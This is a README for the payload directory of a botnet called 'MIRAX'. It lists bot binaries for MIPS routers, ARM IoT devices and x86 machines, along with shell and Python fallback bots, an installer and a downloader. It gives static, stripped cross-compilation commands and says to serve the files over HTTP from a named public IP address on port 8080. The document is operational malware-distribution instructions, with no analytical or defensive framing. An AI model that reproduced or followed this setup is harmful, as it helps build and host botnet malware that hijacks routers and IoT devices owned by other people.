MIRAX PAYLOAD FILES
===================

These are the payload files served by the web server on port 8080.

FILES:
-------
bot.mips      - MIPS binary (big endian) - routers
bot.mipsel    - MIPS binary (little endian) - routers
bot.arm       - ARM binary (32-bit) - Raspberry Pi, IoT
bot.arm64     - ARM binary (64-bit) - newer devices
bot.x86       - x86 binary - PCs, servers
bot.py        - Python bot - fallback
bot.sh        - Shell script - fallback for busybox
install.sh    - Installer script
bot_downloader.sh - Lightweight downloader

COMPILATION:
-------------
MIPS:   mips-linux-gnu-gcc -o bot.mips bot_mips.c -lpthread -static -s
MIPSEL: mipsel-linux-gnu-gcc -o bot.mipsel bot_mips.c -lpthread -static -s
ARM:    arm-linux-gnueabi-gcc -o bot.arm bot_arm.c -lpthread -static -s
ARM64:  aarch64-linux-gnu-gcc -o bot.arm64 bot_arm.c -lpthread -static -s
x86:    gcc -o bot.x86 bot_x86.c -lpthread -static -s

SERVING:
---------
Place compiled binaries in this directory.
Start web server: python3 webserver.py
Files available at: http://85.11.167.41:8080/[filename]